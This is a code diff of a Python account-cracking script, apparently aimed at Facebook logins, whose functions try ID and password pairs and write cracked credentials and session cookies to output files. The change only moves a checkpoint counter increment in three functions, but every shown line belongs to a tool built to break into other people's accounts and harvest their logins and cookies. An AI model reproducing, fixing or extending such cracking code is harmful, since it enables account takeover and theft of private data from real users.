@@ -501,7 +501,6 @@ def crackvalidate(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
-				cp+=1
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
 				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
@@ -511,6 +510,7 @@ def crackvalidate(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
+				cp+=1
 				break	
 				
 			else:
@@ -584,7 +584,6 @@ def crackreguler(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
-				cp+=1
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
 				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
@@ -594,6 +593,7 @@ def crackreguler(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
+				cp+=1
 				break	
 				
 			else:
@@ -674,7 +674,6 @@ def crackasyinc(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
-				cp+=1
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
 				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
@@ -684,6 +683,7 @@ def crackasyinc(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
+				cp+=1
 				break	
 				
 			else:
